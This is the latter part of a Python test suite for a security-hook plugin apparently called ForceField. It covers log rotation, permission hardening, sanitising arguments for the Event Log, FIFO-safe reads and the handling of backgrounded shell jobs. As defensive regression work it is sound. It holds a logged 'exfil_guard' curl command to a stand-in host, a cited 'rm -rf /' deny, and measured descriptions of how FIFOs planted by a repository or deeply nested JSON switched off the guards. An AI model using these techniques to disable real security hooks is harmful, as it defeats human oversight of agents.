    check(_elapsed <= _sinks.LOG_BUDGET_SECONDS + _SLOW + 0.5,
          "%s: stayed inside LOG_BUDGET_SECONDS plus one in-flight write "
          "(%.2fs)" % (_kind, _elapsed))

print("PASS: one logging budget per process covers the drain, the synchronous "
      "path and a second drain, and never at the file sink's expense")


# =============================================================================
# 9. The file sink's rollover: nothing lost, nothing loosened
#
# The 32-writer loss sweep is a separate, minutes-long measurement. What belongs
# in the suite is the property that regressed silently twice: the permission
# hardening used to sit *after* two early returns, so a rollover that found
# another process had already rotated, or that could not take the lock, left the
# backups at whatever the umask produced. It is now in a `finally`, and this
# exercises all three paths.
# =============================================================================

_rot_home = Path(tempfile.mkdtemp(prefix="forcefield-rot-"))
_saved_dir = _sinks._file_dir
_saved_prepared = _sinks._dir_prepared
_saved_max = _sinks.FALLBACK_MAX_BYTES
_saved_backups = _sinks.FALLBACK_BACKUP_COUNT
try:
    _sinks._file_dir = _rot_home / ".claude" / "hooks"
    _sinks._dir_prepared = False
    _sinks.FALLBACK_MAX_BYTES = 4096
    _sinks.FALLBACK_BACKUP_COUNT = 3
    _sinks._selected = frozenset({_sinks.NAME_FILE})

    _tags = set()
    for _i in range(120):
        _rec = _hlog.build_event("rot_probe", "deny", pattern_matched="tag%d" % _i,
                                 command="y" * 200)
        _tags.add("tag%d" % _i)
        _sinks.write(_sinks.NAME_FILE, _rec, _sinks.render(_rec), 17, "fault")

    _base = _sinks.file_path()
    _files = [_base] + [Path(str(_base) + ".%d" % _n)
                        for _n in range(1, _sinks.FALLBACK_BACKUP_COUNT + 1)]
    _present = [f for f in _files if f.exists()]
    check(len(_present) > 1, "the log actually rotated (%d files)" % len(_present))
    check((os.stat(str(_sinks.file_dir())).st_mode & 0o777) == 0o700,
          "the log directory is 0700 after rotation")
    for _f in _present:
        check((os.stat(str(_f)).st_mode & 0o777) == 0o600,
              "%s is 0600 after rotation" % _f.name)
    check(not Path(str(_base) + ".%d" % (_sinks.FALLBACK_BACKUP_COUNT + 1)).exists(),
          "the chain stops at FALLBACK_BACKUP_COUNT")

    _seen, _rotated, _malformed = set(), 0, 0
    for _f in _present:
        for _line in _f.read_text(errors="replace").splitlines():
            if not _line.strip():
                continue
            try:
                _rec = json.loads(_line)
            except Exception:
                _malformed += 1
                continue
            _attrs = _rec["Attributes"]
            if _attrs["forcefield.guard"] == "log_sinks":
                _rotated += 1
                check(_attrs["forcefield.rotated_to"] == "security.log.1",
                      "the rotation marker names where the records went")
                check(_attrs["forcefield.rotated_bytes"] >= _sinks.FALLBACK_MAX_BYTES,
                      "the marker carries the size that triggered it")
                # The marker is built through the one record envelope, not a
                # second one inside the sink layer -- so it carries the same
                # OCSF trio and record class as every other record.
                check(_attrs["forcefield.record_class"] == "lifecycle",
                      "the rotation marker is a lifecycle record")
                check(_attrs["ocsf.class_uid"] == 6002
                      and _attrs["ocsf.type_uid"] == 600299,
                      "the marker uses Application Lifecycle / Other")
                for _req in ("ocsf.time", "ocsf.metadata", "ocsf.finding_info"):
                    check(_req in _attrs,
                          "the marker carries the OCSF-required %s" % _req)
            else:
                _seen.add(_attrs["forcefield.pattern"])
    check(_malformed == 0, "no malformed line survived the rollovers")
    check(_rotated > 0, "a log.rotated marker was written under the lock")
    _lost = _tags - _seen
    # Records evicted off the end of the chain are retention, not loss: only the
    # ones that should still be within the window are counted.
    check(len(_lost) < len(_tags),
          "records survived the rollovers (%d of %d present)"
          % (len(_seen), len(_tags)))

    # The path that used to leave backups loose: the lock cannot be taken, so the
    # rollover is skipped -- and the hardening must still have run.
    for _f in _present:
        os.chmod(str(_f), 0o644)
    os.chmod(str(_sinks.file_dir()), 0o755)
    _held = os.fdopen(os.open(str(_sinks.file_dir() / ".rotate.lock"),
                              os.O_RDWR | os.O_CREAT, 0o600), "r+b")
    _blocker = portable_lock.FileLock(_held, timeout=0)
    check(_blocker.acquire(), "the test holds the rotation lock")
    try:
        _sinks._rotation_failed = False
        _sinks._rotate(str(_base))
        check(_sinks.rotation_failed(),
              "a rollover that could not take the lock leaves a breadcrumb")
        check((os.stat(str(_sinks.file_dir())).st_mode & 0o777) == 0o700,
              "the directory is re-hardened even when the lock was not taken")
        for _f in _present:
            check((os.stat(str(_f)).st_mode & 0o777) == 0o600,
                  "%s is re-hardened even when the lock was not taken" % _f.name)
    finally:
        _blocker.release()
        _held.close()

    # The breadcrumb reaches a record, not just a module global: a rollover
    # this process could not complete is otherwise invisible, because the append
    # still succeeds and the only symptom is a log quietly past its budget.
    check(_hlog.build_event("rot_probe", "allow")["Attributes"].get(
              "forcefield.rotation_failed") is True,
          "the failed rollover is reported on the next record this process builds")

    # ...and the write still happens: an oversized file beats a lost record.
    _rec = _hlog.build_event("rot_probe", "deny", pattern_matched="after-lock",
                             command="z" * 200)
    check(_sinks.write(_sinks.NAME_FILE, _rec, _sinks.render(_rec), 17, "fault"),
          "a rollover that could not run does not stop the append")
    check("after-lock" in _base.read_text(errors="replace"),
          "the record that lost the rollover is still in the log")

    # ...and it costs ONE wait, not one per record. `_write_file` calls
    # `_rotate` on every write while the file is oversized, and the deadline
    # bounds one acquisition, so a lock held by another process cost 1.0s per
    # record with no cap: measured at 6.059s for six records and 24.201s for
    # twenty-four, both past the 5s timeout that would have killed the hook and
    # taken its verdict. The flag was already written on failure and nothing
    # read it.
    _RECORDS = 24
    _sinks._rotation_failed = False
    _sinks._budget_spent = 0.0
    _held = os.fdopen(os.open(str(_sinks.file_dir() / ".rotate.lock"),
                              os.O_RDWR | os.O_CREAT, 0o600), "r+b")
    _blocker = portable_lock.FileLock(_held, timeout=0)
    check(_blocker.acquire(), "the test holds the rotation lock again")
    try:
        _started = time.monotonic()
        for _i in range(_RECORDS):
            _rec = _hlog.build_event("rot_probe", "deny",
                                     pattern_matched="budget%d" % _i,
                                     command="w" * 200)
            _sinks.write(_sinks.NAME_FILE, _rec, _sinks.render(_rec), 17, "fault")
        _budget_wall = time.monotonic() - _started
    finally:
        _blocker.release()
        _held.close()
    check(_budget_wall <= _sinks.LOG_BUDGET_SECONDS + 1.0,
          "%d records against a held rotation lock cost one wait, not %d "
          "(%.2fs)" % (_RECORDS, _RECORDS, _budget_wall))
    check(_budget_wall < 5.0,
          "and the whole burst stayed inside the 5s hook timeout (%.2fs)"
          % _budget_wall)
    _tail = _base.read_text(errors="replace")
    check(sum(1 for _n in range(_RECORDS) if "budget%d" % _n in _tail) == _RECORDS,
          "every record in the burst still reached the archive")

    # ...and once a rollover has failed, this process stops attempting one at
    # all. Observable rather than asserted on a flag: `_harden_log_mode` runs in
    # `_rotate`'s `finally` on every path, so a process still entering the
    # rollover would chmod the log back to 0600 on the next write. Leaving the
    # mode loose and writing again is the discriminator.
    check(_sinks.rotation_failed(),
          "the burst left the rotation-failed breadcrumb set")
    os.chmod(str(_base), 0o644)
    _rec = _hlog.build_event("rot_probe", "deny", pattern_matched="after-budget",
                             command="v" * 200)
    check(_sinks.write(_sinks.NAME_FILE, _rec, _sinks.render(_rec), 17, "fault"),
          "the append still happens after a failed rollover")
    check((os.stat(str(_base)).st_mode & 0o777) == 0o644,
          "a process that already failed to roll over does not re-enter the "
          "rollover on every subsequent oversized write")
    os.chmod(str(_base), 0o600)
finally:
    _sinks._file_dir = _saved_dir
    _sinks._dir_prepared = _saved_prepared
    _sinks.FALLBACK_MAX_BYTES = _saved_max
    _sinks.FALLBACK_BACKUP_COUNT = _saved_backups
    _sinks._selected = _saved_selected
    _sinks._rotation_failed = False
    shutil.rmtree(str(_rot_home), ignore_errors=True)

print("PASS: the file sink rotates without loss and re-hardens on every path")


# =============================================================================
# 10. The two surfaces that exist only for a platform nothing here has run on
#
# The Windows Event Log command and the sink self-description are built on macOS
# and Linux and can only be checked against their documented contracts. What is
# pinned here is the part that would be a security defect rather than a missing
# feature: the argv sanitiser.
# =============================================================================

_evt_record = _hlog.build_event(
    "exfil_guard", "deny",
    pattern_matched='typosquat:req"uests %n %s',
    command="curl https://x.example/a" + chr(10) + "b" + chr(13) + chr(0) + "c",
    context={"session_id": "win-1"})
_evt_line = _sinks.render(_sinks.project(_evt_record, _sinks.CONF_LOCAL))
_commands = _sinks.winevt_commands(_evt_record, _evt_line, 17)
check(len(_commands) == 1,
      "a record inside the insertion-string limit is one eventcreate call")
_argv = _commands[0]

check(_argv[0] == "eventcreate.exe"
      and _argv[1:5] == ["/L", "APPLICATION", "/T", "ERROR"],
      "the Event Log command names the Application channel and the entry type")
check("/SO" not in _argv,
      "no /SO: registering a source writes HKLM, i.e. it needs an administrator, "
      "and a hook that only logs when installed elevated is a hook that does not log")
_payload = _argv[-1]
check('"' not in _payload,
      "no double quote survives: list2cmdline escapes per the MSVC CRT rules and "
      "eventcreate.exe is not guaranteed to unescape them the same way")
check(_payload.count("%") == _payload.count("%%") * 2,
      "every percent sign is doubled: the event viewer treats a percent-n in a "
      "logged string as an insertion string, and several guards interpolate "
      "matched input into forcefield.pattern")
check(not any(ord(c) < 0x20 or ord(c) == 0x7F for c in _payload),
      "no control character survives: a newline or a NUL truncates the argument")
check(len(_payload) <= _sinks.EVENTCREATE_PAYLOAD_MAX + 32,
      "the payload stays inside the insertion-string and command-line limits")

# The sanitiser on its own, one hazard at a time. The composite record above
# proves the three transformations happen together; these prove each one is the
# transformation it claims to be, on input the composite cannot contain. All
# three are argv hazards rather than cosmetic ones, and only the middle one is
# a security property of ForceField's own data rather than of the CRT.
for _raw, _want, _why in (
    ('a"b"c', "a'b'c",
     "a double quote becomes a single one, because list2cmdline escapes it per "
     "the MSVC CRT rules and eventcreate.exe need not unescape it the same way"),
    ("typosquat:%n%s%1!s!", "typosquat:%%n%%s%%1!s!",
     "every percent is doubled, so matched input interpolated into a pattern "
     "cannot become an event-viewer insertion string"),
    ("a\nb\rc\x00d\x1fe\x7ff", "a b c d e f",
     "every control character, newline, carriage return, NUL and DEL becomes a "
     "space rather than truncating or splitting the argument"),
    ("", "", "the empty payload is not a special case"),
    ("plain ascii /L /T /ID", "plain ascii /L /T /ID",
     "nothing else is rewritten, so the record stays readable"),
):
    check(_sinks._sanitize_for_argv(_raw) == _want, _why)
# Doubling is not idempotent by accident: sanitising twice must double again,
# which is what proves the single pass is a real escape rather than a filter.
check(_sinks._sanitize_for_argv(_sinks._sanitize_for_argv("%")) == "%%%%",
      "the percent escape composes as an escape, not as a normalisation")

_ids = set()
for _decision in sorted(_hlog._SEV) + ["a-decision-nobody-modelled"]:
    _num = _hlog._severity(_decision)[0]
    _entry_type, _event_id = _sinks.winevt_entry(_num)
    _ids.add(_event_id)
    check(_entry_type in ("ERROR", "WARNING", "INFORMATION"),
          "%s maps to a documented entry type (%s)" % (_decision, _entry_type))
    check(1 <= _event_id <= 1000,
          "%s maps to an event id inside the documented 1..1000 range (%d)"
          % (_decision, _event_id))
check(len(_ids) >= 5,
      "the event ids distinguish the severity bands (%s)" % sorted(_ids))
check(_sinks._write_winevt(_evt_record, _evt_line, 17) is False,
      "the Event Log sink is inert anywhere that is not Windows")

_described = _sinks.describe()
check(_sinks.NAME_FILE in _described and _described[_sinks.NAME_FILE]["available"],
      "the sink description always names the file sink")
check(_described[_sinks.NAME_FILE]["carries_free_text"] is True,
      "the file sink is the one that carries the free text")
for _name, _entry in _described.items():
    check({"available", "confidentiality", "carries_free_text"} <= set(_entry),
          "%s is described with availability and confidentiality" % _name)
    check(_entry["carries_free_text"] ==
          (_entry["confidentiality"] >= _sinks.FREE_TEXT_MIN_CONFIDENTIALITY),
          "%s's free-text claim follows its measured confidentiality" % _name)

print("PASS: the Event Log command construction and the sink self-description")


# =============================================================================
# 11. Every read on the hook path is O_NONBLOCK and S_ISREG-checked
#
# This is the class, not a path list, because a path list is what let it recur.
# Three separate rounds each fixed the reads they had thought of and each left
# more behind: `~/.claude/forcefield.json` and the compiled Sigma ruleset, then
# `.claude-plugin/plugin.json` and `hooks/hooks.json`, then
# `.claude/hook-allowlist.json`, `git_forensics._read_text`, `memo.last_ask`,
# `agent_guard._spawn_window_count` and `inspect_remote._read_store`. Measured,
# one `mkfifo` per path: the plugin manifest killed 19 of 26 registrations and
# turned `container_first.sh`'s exit-2 hard deny on `rm -rf /` into a SIGKILL;
# the allowlist hung 10 of 19 guards with zero bytes of stdout and no record
# written at all; `.gitmodules` and `.git/config` -- files the untrusted
# repository itself ships -- switched off the guard whose job is to read them.
#
# `open()` on a FIFO in read mode waits for a writer forever: it raises nothing
# and has no deadline, so no `except` and no budget catches it, and a hook killed
# at its 5 s timeout delivers no verdict at all.
#
# So: no module a hook imports may open a file for reading with the builtin
# `open`, `Path.open`, `Path.read_text` or `Path.read_bytes`. The one primitive
# is `hook_event.open_regular_fd`, and the readers built on it.
# =============================================================================

_READ_MODES = ("r", "rb", "br", "rt", "tr", "r+", "rb+", "r+b")
# Off the hook path by construction: `sigma_compiler` runs only inside the venv
# `scripts/install.sh` builds, offline, over a repository the operator cloned.
_NOT_ON_THE_HOOK_PATH = frozenset({"sigma_compiler"})
_UNGUARDED_READS = []


def _is_read_mode(node):
    """Whether an `open`-shaped call opens for reading."""
    for index, arg in enumerate(node.args):
        if index == 1 and isinstance(arg, ast.Constant):
            return isinstance(arg.value, str) and arg.value in _READ_MODES
    for keyword in node.keywords:
        if keyword.arg == "mode" and isinstance(keyword.value, ast.Constant):
            return (isinstance(keyword.value.value, str)
                    and keyword.value.value in _READ_MODES)
    return len(node.args) < 2 and not any(k.arg == "mode" for k in node.keywords)


for _module in sorted(set(MODULES) - _NOT_ON_THE_HOOK_PATH):
    _path = HOOKS / (_module + ".py")
    _tree = ast.parse(_path.read_text(encoding="utf-8"), filename=str(_path))
    for _node in ast.walk(_tree):
        if not isinstance(_node, ast.Call):
            continue
        _func = _node.func
        _name = (_func.id if isinstance(_func, ast.Name)
                 else _func.attr if isinstance(_func, ast.Attribute) else None)
        if _name in ("open",) and _is_read_mode(_node):
            _UNGUARDED_READS.append("%s.py:%d %s(...)"
                                    % (_module, _node.lineno, _name))
        elif _name in ("read_text", "read_bytes"):
            # `hook_event.read_regular_text` / `read_regular_bytes` are ours and
            # are the guarded form; anything else is a Path method.
            if _name not in ("read_regular_text", "read_regular_bytes"):
                _UNGUARDED_READS.append("%s.py:%d .%s()"
                                        % (_module, _node.lineno, _name))

check(not _UNGUARDED_READS,
      "every read on the hook path goes through hook_event.open_regular_fd; "
      "these do not: %s" % _UNGUARDED_READS[:6])

# ---------------------------------------------------------------------------
# The same census for `os.open`, which the walk above cannot see AT ALL.
#
# `_is_read_mode` inspects a `mode` STRING; `os.open` takes a flags INTEGER, so
# every `os.open` in the tree was outside the gate's vocabulary rather than
# passing it. That is where `memo._open_private` lived: the one `os.open` on the
# hook path with neither `O_NONBLOCK` nor an `S_ISREG` check, reached from
# `clamp_and_emit` -> `find_memo` -> `_touch` -> `_write_store` on every natural
# `ask`. Measured with 4000 FIFOs pre-created at `memos.json.tmp.<pid>`:
# `wall=0.044s rc=0` became `wall=9.005s rc=None` -- killed at the 5 s timeout
# with no verdict and no record. Measured flags behaviour, both floors:
# `O_RDWR|O_CREAT` on a FIFO returns in 0.000 s and `O_WRONLY|O_CREAT|O_TRUNC`
# waits for a reader forever, so a census that only looked at ONE of the two
# halves would have cleared `memos.lock` and missed `memos.json.tmp`.
#
# Function-level granularity on purpose: both halves are properties of the
# opening function, and all six sites in the tree write them together. `S_ISREG`
# must be applied to an `os.fstat` of the DESCRIPTOR -- a prior `stat` of the
# path races with a same-uid process swapping a FIFO in.
# ---------------------------------------------------------------------------

_OS_OPEN_WRITE_FLAGS = ("O_NONBLOCK",)
_OS_OPEN_VIOLATIONS = []


def _names_in(node):
    """Every attribute, bare name and string constant mentioned under `node`.

    String constants count because the portable spelling of a flag that does not
    exist on every platform is `getattr(os, "O_NONBLOCK", 0)`, which is how five
    of the six sites in this tree write it — an AST walk that only collected
    `ast.Attribute` would report all five as missing the flag they carry.
    """
    used = set()
    for sub in ast.walk(node):
        if isinstance(sub, ast.Attribute):
            used.add(sub.attr)
        elif isinstance(sub, ast.Name):
            used.add(sub.id)
        elif isinstance(sub, ast.Constant) and isinstance(sub.value, str):
            used.add(sub.value)
    return used


def _is_os_open(node):
    return (isinstance(node, ast.Call)
            and isinstance(node.func, ast.Attribute)
            and node.func.attr == "open"
            and isinstance(node.func.value, ast.Name)
            and node.func.value.id == "os")


def _checks_isreg_on_descriptor(fn):
    """Whether `fn` calls `S_ISREG` on the mode of an `os.fstat`, not a `stat`."""
    for node in ast.walk(fn):
        if not (isinstance(node, ast.Call)
                and isinstance(node.func, ast.Attribute)
                and node.func.attr == "S_ISREG"):
            continue
        if "fstat" in _names_in(node):
            return True
    return False


for _module in sorted(set(MODULES) - _NOT_ON_THE_HOOK_PATH):
    _path = HOOKS / (_module + ".py")
    _tree = ast.parse(_path.read_text(encoding="utf-8"), filename=str(_path))
    for _fn in ast.walk(_tree):
        if not isinstance(_fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
            continue
        _opens = [n for n in ast.walk(_fn) if _is_os_open(n)]
        if not _opens:
            continue
        _used = _names_in(_fn)
        _missing = [f for f in _OS_OPEN_WRITE_FLAGS if f not in _used]
        if _missing:
            _OS_OPEN_VIOLATIONS.append(
                "%s.py:%d %s() opens without %s"
                % (_module, _opens[0].lineno, _fn.name, ",".join(_missing)))
        if not _checks_isreg_on_descriptor(_fn):
            _OS_OPEN_VIOLATIONS.append(
                "%s.py:%d %s() does not S_ISREG the descriptor"
                % (_module, _opens[0].lineno, _fn.name))

check(not _OS_OPEN_VIOLATIONS,
      "every os.open on the hook path carries O_NONBLOCK and S_ISREG-checks the "
      "DESCRIPTOR it got back; these do not: %s" % _OS_OPEN_VIOLATIONS[:6])

# The census is not vacuous: it really does see the `os.open` sites, and there
# are more of them than the one that was broken. If this count reaches zero the
# walk has stopped matching and the check above is passing on an empty set.
_OS_OPEN_SITES = 0
for _module in sorted(set(MODULES) - _NOT_ON_THE_HOOK_PATH):
    _path = HOOKS / (_module + ".py")
    _tree = ast.parse(_path.read_text(encoding="utf-8"), filename=str(_path))
    _OS_OPEN_SITES += sum(1 for n in ast.walk(_tree) if _is_os_open(n))
check(_OS_OPEN_SITES >= 6,
      "the os.open census matches the sites it is meant to police (found %d, "
      "expected at least the 6 in hook_event, config, memo, agent_guard and "
      "log_sinks x2)" % _OS_OPEN_SITES)

# And it is live: `memo._open_private` -- the site the census was written for --
# really does refuse a FIFO rather than wait for a reader. Driven in a child
# with a deadline, because the failure mode under test is a HANG: an in-process
# assertion could not distinguish "refused" from "still waiting".
if hasattr(os, "mkfifo"):
    _memo_fifo_home = Path(tempfile.mkdtemp(prefix="forcefield-memo-fifo-"))
    _memo_fifo = _memo_fifo_home / "memos.json.tmp.1"
    os.mkfifo(str(_memo_fifo), 0o600)
    _memo_probe = (
        "import os, sys\n"
        "sys.path.insert(0, %r)\n"
        "import memo\n"
        "try:\n"
        "    fd = memo._open_private(__import__('pathlib').Path(%r),\n"
        "                            os.O_WRONLY | os.O_CREAT | os.O_TRUNC)\n"
        "except OSError as exc:\n"
        "    print('REFUSED')\n"
        "else:\n"
        "    os.close(fd)\n"
        "    print('OPENED')\n"
    ) % (str(HOOKS), str(_memo_fifo))
    try:
        _memo_result = subprocess.run(
            [sys.executable, "-c", _memo_probe],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=10,
        )
        _memo_out = _memo_result.stdout.decode("utf-8", "replace").strip()
    except subprocess.TimeoutExpired:
        _memo_out = "HUNG"
    check(_memo_out.endswith("REFUSED"),
          "memo._open_private refuses a FIFO at memos.json.tmp instead of "
          "waiting for a reader that never comes -- this is the open reached "
          "from clamp_and_emit on every natural ask, and a hang here is a "
          "killed hook with its verdict discarded: got %r" % _memo_out)

# The gate is live: the primitive it points at exists and really does refuse a
# FIFO without waiting. A named pipe with no writer is the exact shape, and this
# has to come back rather than hang.
_fifo_home = Path(tempfile.mkdtemp(prefix="forcefield-fifo-gate-"))
_fifo_path = _fifo_home / "victim.json"
if hasattr(os, "mkfifo") and not _fifo_path.exists():
    os.mkfifo(str(_fifo_path), 0o600)
if hasattr(os, "mkfifo"):
    _started = time.monotonic()
    check(_hook_event.read_regular_text(_fifo_path, 4096) == "",
          "read_regular_text returns empty for a FIFO instead of waiting")
    check(_hook_event.read_regular_tail(_fifo_path, 4096) == b"",
          "read_regular_tail returns empty for a FIFO instead of waiting")
    check(_hook_event.open_regular_fd(_fifo_path) is None,
          "open_regular_fd refuses a FIFO outright")
    check(time.monotonic() - _started < 1.0,
          "and all three returned promptly (%.3fs) -- the whole point is that "
          "there is no deadline to expire" % (time.monotonic() - _started))

# A regular file still reads, in both directions, so the gate is not vacuous.
_plain = _fifo_home / "plain.txt"
_plain.write_bytes(b"line one\nline two\nline three\n")
check(_hook_event.read_regular_text(_plain, 8) == "line one",
      "read_regular_text bounds the READ, not a slice taken afterwards")
check(_hook_event.read_regular_tail(_plain, 11) == b"line three\n",
      "read_regular_tail returns the END of the file")
check(_hook_event.read_regular_text(_fifo_home / "absent.json", 16) == "",
      "an absent file is indistinguishable from an unreadable one")

# The parse that every guard's stdin goes through: RecursionError is a
# RuntimeError, not a ValueError, so `except (JSONDecodeError, ValueError)` let a
# 3000-deep sibling key escape past the uninspectable-implies-ask rung into the
# module-level crash handler -- a hard deny out as `{}` in 0.05 s with no record.
check(_hook_event.parse_event("[" * 3000 + "]" * 3000) is None,
      "parse_event reports a RecursionError-deep payload as uninspectable")
check(_hook_event.parse_event('{"a": 1}') == {"a": 1},
      "and still parses an ordinary event")
for _not_an_object in ('"a string"', "[1,2]", "null", "17", "", "not json"):
    check(_hook_event.parse_event(_not_an_object) is None,
          "a payload that is not a JSON object is uninspectable too: %r"
          % _not_an_object)

# ---------------------------------------------------------------------------
# A hook's effective duration is its longest-lived DESCENDANT holding stdout.
#
# Claude Code waits for stdout EOF, not for the hook process. Measured against
# the installed binary (2.1.220, hook registered with `"timeout": 5`): a hook
# whose parent exits in 1.4 ms but leaves a detached child holding the pipe
# produced a 24.9 s turn, `duration_ms=24946`. So `( … ) &` is NOT
# "background, non-blocking" -- backgrounding detaches the process and leaves
# the descriptors inherited. `hooks/sigma_update.sh` did exactly that around a
# SigmaHQ `git pull` plus a full rule compile, neither of which is bounded, and
# its declared 10 s SessionStart timeout therefore bounded nothing: measured
# `parent exited at 0.039s rc=0 ; stdout EOF at 30.260s`.
#
# Driven end to end rather than grepped, because the property is about
# descriptors and only a real fork can show it.
if shutil.which("bash") and hasattr(os, "mkfifo"):
    _bg_home = Path(tempfile.mkdtemp(prefix="forcefield-bg-hook-"))
    try:
        _bg_sigma_dir = _bg_home / ".claude" / "forcefield" / "sigma"
        (_bg_sigma_dir / "venv" / "bin").mkdir(parents=True)
        _bg_venv_python = _bg_sigma_dir / "venv" / "bin" / "python3"
        # Stands in for the compiler run: the one unbounded thing in the body.
        _bg_venv_python.write_text("#!/bin/sh\nsleep 20\n")
        os.chmod(str(_bg_venv_python), 0o755)
        _bg_repo = _bg_home / "sigma-rules"
        _bg_repo.mkdir()

        _bg_env = dict(os.environ)
        _bg_env.update({"HOME": str(_bg_home), "SIGMA_REPO": str(_bg_repo),
                        "CLAUDE_PLUGIN_ROOT": str(ROOT),
                        "FORCEFIELD_LOG_SINKS": "none"})
        _bg_started = time.monotonic()
        _bg_proc = subprocess.Popen(
            ["bash", str(HOOKS / "sigma_update.sh")],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL, env=_bg_env)
        try:
            _bg_proc.stdin.write(b'{"session_id":"bg","hook_event_name":'
                                 b'"SessionStart"}')
            _bg_proc.stdin.close()
            # The observable: when does the READER see EOF? A caller that waits
            # for it -- which the harness does -- is held for exactly this long.
            _bg_proc.stdout.read()
            _bg_eof = time.monotonic() - _bg_started
        finally:
            _bg_proc.stdout.close()
            try:
                _bg_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:      # pragma: no cover
                _bg_proc.kill()
        check(_bg_eof < 5.0,
              "sigma_update.sh's stdout reaches EOF when the HOOK exits, not "
              "when its backgrounded git-pull-and-compile finishes: a reader "
              "waiting for EOF was held %.3fs against a declared 10s timeout, "
              "and the child sleeps 20s" % _bg_eof)

        # ...and the OTHER half of that redirection, which the case above
        # cannot see. `>/dev/null 2>&1` alone satisfies every assertion so far,
        # because stdout EOF is exactly what it produces; the `<&-` had no gate
        # at all, and a mutant dropping only it escaped all 18 suites.
        #
        # It cannot be shown on the shipped script, and that is a measured fact
        # rather than an excuse. On bash 3.2.57 (macOS) and 5.2.37 (Debian 13)
        # alike, with job control OFF -- every non-interactive script, and
        # `bash -m script.sh` does NOT turn it on -- POSIX already gives an
        # asynchronous list a stdin with the properties of /dev/null, so
        # `( … ) &` inherits nothing and the redirection is invisible. Only
        # `set -m` INSIDE the script flips it, and nothing outside can inject
        # that. So the property is established here on a pair of synthetic
        # scripts that differ by exactly the redirection, and the shipped
        # program is then required to carry it. The first half is what stops
        # the second from being the same structural-only gate this round is
        # fixing everywhere else: it says what the token BUYS, measured, before
        # asserting the token is there.
        #
        # The observable is EPIPE. With every reader gone a write to the pipe
        # raises BrokenPipeError immediately; with one reader left it lands in
        # the pipe buffer and succeeds.
        def _bg_child_holds_stdin(name, body):
            _script = _bg_home / (name + ".sh")
            _script.write_text("#!/bin/bash\nset -euo pipefail\n" + body,
                               encoding="utf-8")
            _proc = subprocess.Popen(
                ["bash", str(_script)], stdin=subprocess.PIPE,
                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
            try:
                _proc.stdout.read()                # the script itself is gone
                _proc.wait(timeout=10)
                try:
                    os.write(_proc.stdin.fileno(), b"x")
                    return True
                except OSError:                    # BrokenPipeError included
                    return False
            finally:
                for _stream in (_proc.stdin, _proc.stdout):
                    try:
                        _stream.close()
                    except OSError:
                        pass

        _BG_BODY = "( sleep 5 ) >/dev/null 2>&1 %s&\nexit 0\n"
        check(_bg_child_holds_stdin("jobctl-open", "set -m\n" + _BG_BODY % "")
              is True,
              "the premise: under job control a backgrounded subshell DOES "
              "inherit the script's stdin, so a caller writing to it is held "
              "by a descendant that outlives the script")
        check(_bg_child_holds_stdin("jobctl-closed", "set -m\n" + _BG_BODY % "<&- ")
              is False,
              "and `<&-` on the backgrounded list is exactly what stops it: "
              "same script, same job control, one redirection different")
        check(_bg_child_holds_stdin("nojobctl-open", _BG_BODY % "") is False,
              "without job control POSIX already assigns the asynchronous "
              "list a /dev/null stdin, which is why this redirection cannot "
              "be observed on the shipped hook and is asserted on its source")

        _SHELL_BG = re.compile(r"^\)[^\n]*&[ \t]*$", re.MULTILINE)
        _bg_lists = 0
        for _sh in sorted(HOOKS.glob("*.sh")) + sorted((ROOT / "scripts").glob("*.sh")):
            for _line in _SHELL_BG.findall(_sh.read_text(encoding="utf-8")):
                _bg_lists += 1
                check("<&-" in _line and ">/dev/null" in _line,
                      "%s backgrounds a subshell without detaching BOTH "
                      "descriptors -- stdout costs the turn its EOF and stdin "
                      "costs a writing caller its EPIPE: %r" % (_sh.name, _line))
        check(_bg_lists >= 1,
              "the backgrounded-list census found something to check: if the "
              "spelling changed, re-point the pattern rather than deleting it")
    finally:
        shutil.rmtree(str(_bg_home), ignore_errors=True)

print("PASS: every read on the hook path refuses a FIFO, and an uninspectable "
      "event is never a silent parse")

# =============================================================================
# 12. One product name, everywhere
#
# The product name is not only prose. It is the plugin identity, three $HOME
# paths, the slash-command namespace and the attribute key on every record. The
# parts that are data fail SILENTLY when one of them drifts: a never-
# suppressible pattern name that no longer matches locks nothing, a state path
# that no longer resolves orphans the owner's config back to defaults, and a
# documented jq recipe keyed on the wrong prefix returns empty forever.
#
# There is no single constant to point at instead. The import graph forbids one:
# `log_sinks` sits below `hook_logging` and may import neither it nor
# `patterns`, so a shared namespace constant would need a back edge that layer
# rule exists to prevent. This census is what stands in for it.
# =============================================================================

# Assembled rather than spelled out, so this file needs no exemption of its own.
# A gate that has to allowlist its own source cannot catch a regression in it.
_LEGACY_RE = re.compile("port" + "cullis", re.IGNORECASE)

_tracked = [p for p in subprocess.run(
    ["git", "ls-files", "-z"], cwd=str(ROOT),
    capture_output=True, text=True, check=True).stdout.split("\0") if p]
check(len(_tracked) > 50,
      "the tracked-file census found the repository (%d files)" % len(_tracked))

_legacy_hits = {}
for _rel in _tracked:
    try:
        _body = (ROOT / _rel).read_text(encoding="utf-8", errors="replace")
    except OSError:
        continue
    _lines = [_i for _i, _line in enumerate(_body.splitlines(), 1)
              if _LEGACY_RE.search(_line)]
    if _lines:
        _legacy_hits[_rel] = _lines

check(not _legacy_hits,
      "a name this product does not use appears in the tree, which is how a "
      "partial rename becomes a silent security regression where the name is a "
      "pattern key or a state path: %s"
      % sorted("%s:%s" % (_r, _l) for _r, _ls in _legacy_hits.items()
               for _l in _ls[:2]))

# The census is only worth anything if the needle would have been found. Both
# probes are ASSEMBLED from the same halves as the pattern: spelling either one
# out would plant the literal in this file and the census would flag its own
# source, which is exactly the self-exemption this design avoids.
_probe = "port" + "cullis"
check(_LEGACY_RE.search(_probe) and _LEGACY_RE.search(_probe.upper()),
      "the census needle matches, case-insensitively")
check(any((ROOT / _rel).read_text(encoding="utf-8", errors="replace")
          for _rel in _tracked[:5]),
      "the census actually read file bodies")

print("PASS: no foreign product name survives anywhere in the tree")

print("\n%d assertions passed" % _n)
